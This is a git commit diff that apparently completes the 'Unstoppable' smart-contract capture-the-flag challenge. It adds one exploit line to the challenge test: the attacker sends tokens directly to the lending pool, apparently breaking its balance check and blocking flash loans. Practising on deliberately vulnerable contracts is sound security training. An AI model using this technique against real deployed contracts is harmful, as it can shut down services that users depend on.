ae81578f717a19c8cdb3af663b57620d5b2c7259
Shiva <shanshiva@outlook.com>
2022-02-07 20:23:36 +0530

    Completed Unstoppable Challenge

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
